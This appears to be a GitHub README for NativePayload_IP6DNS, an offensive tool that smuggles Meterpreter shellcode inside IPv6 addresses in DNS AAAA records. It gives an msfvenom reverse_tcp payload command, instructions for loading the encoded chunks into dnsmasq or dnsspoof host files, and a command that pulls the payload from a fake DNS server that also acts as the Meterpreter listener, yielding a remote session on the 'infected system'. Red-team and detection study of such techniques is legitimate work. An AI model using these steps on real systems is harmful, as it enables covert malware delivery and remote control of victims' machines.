# NativePayload_IP6DNS
Published by Damon Mohammadbagher

this tool working like NativePayload_DNS , but in this case this tool working by IPv6 Address and AAAA records for Transferring Backdoor payloads by DNS Traffic ;)


note : this code supported only 990 bytes (99 lines IPV6 ADDRESS foreach 10 bytes) for Payloads , for changing this value you should change source code

note : {fe80:1111:}{fc48:83e4:f0e8:cc00:0000}{:ae0} {test.domain.com}

note : 10 bytes Payload ==> {fc48:83e4:f0e8:cc00:0000} and {:ae0} is payload counter or ID 


Example: msfvenum --arch x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.113 -f c > /payload_string.txt

Replace your Payload_strings.txt file  from "\0xfc\0x48\0x83..." to "fc4883..."

syntax 1 : NativePayload_IP6DNS.exe null "payload string"

Description 1 : Making Hosts files for Linux Dns Server Like Dnsmasq or dnsspoof tools , copy output for this command to DNS Hosts file in linux
you can use Msfvenom tool like example and copy your payload in "payload string"

Example : payload string ==> fc4883e4f0e8cc000000415141505251564831d2ae1

Example: NativePayload_IP6DNS.exe null "payload string" > /dnsmasq.hosts

after this command you have something like these lines in your Hosts file :

Example : /etc/dnsmasq.hosts or /etc/hosts "depend on your configuration for dnsmasq or dnsspoof tools 

fe80:1111:fc48:83e4:f0e8:cc00:0000:ae0 test.domain.com

fe80:1111:4151:4150:5251:5648:31d2:ae1 test.domain.com

fe80:1111:6548:8b52:6048:8b52:1848:ae2 test.domain.com

fe80:1111:8b52:2048:8b72:5048:0fb7:ae3 test.domain.com

fe80:1111:4a4a:4d31:c948:31c0:ac3c:ae4 test.domain.com

fe80:1111:617c:022c:2041:c1c9:0d41:ae5 test.domain.com

.

.

.

fe80:1111:85f6:75b4:41ff:e758:6a00:ae49 test.domain.com

fe80:1111:5949:c7c2:f0b5:a256:ffd5:ae50 test.domain.com





syntax 2 : NativePayload_IP6DNS.exe Payload

description 2 : this switch is for making sample payload for your hosts file


syntax 3 : NativePayload_IP6DNS.exe "FQDN" "Fake_DNS_Server"

description 3 : after making your payloads and copy that in your fake_DNS_Server by dnsmasq or dnsspoof and starting fakeDNSServer , now you can start transferring your Payloads From FakeDNSServer to your Infected system by NativePayload_IP6DNS.exe tool

Example : NativePayload_IP6DNS.exe  test.domain.com  192.168.1.113

note : in this case 192.168.1.113 is your FakeDNSServer also this is your Metasploit: Meterpreter/Listener.

you should have meterpreter session after 1 DNS Response from FakeDNSserver to Client (Backdoor system)

Article : Transferring Backdoor Payloads by DNS AAAA records and IPv6 Address:

link 0: https://www.linkedin.com/pulse/transferring-backdoor-payloads-dns-aaaa-records-ipv6-mohammadbagher

link 1: https://www.peerlyst.com/posts/transferring-backdoor-payloads-by-dns-aaaa-records-and-ipv6-address-damon-mohammadbagher

<p><a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https://github.com/DamonMohammadbagher/NativePayload_IP6DNS"/></a></p>

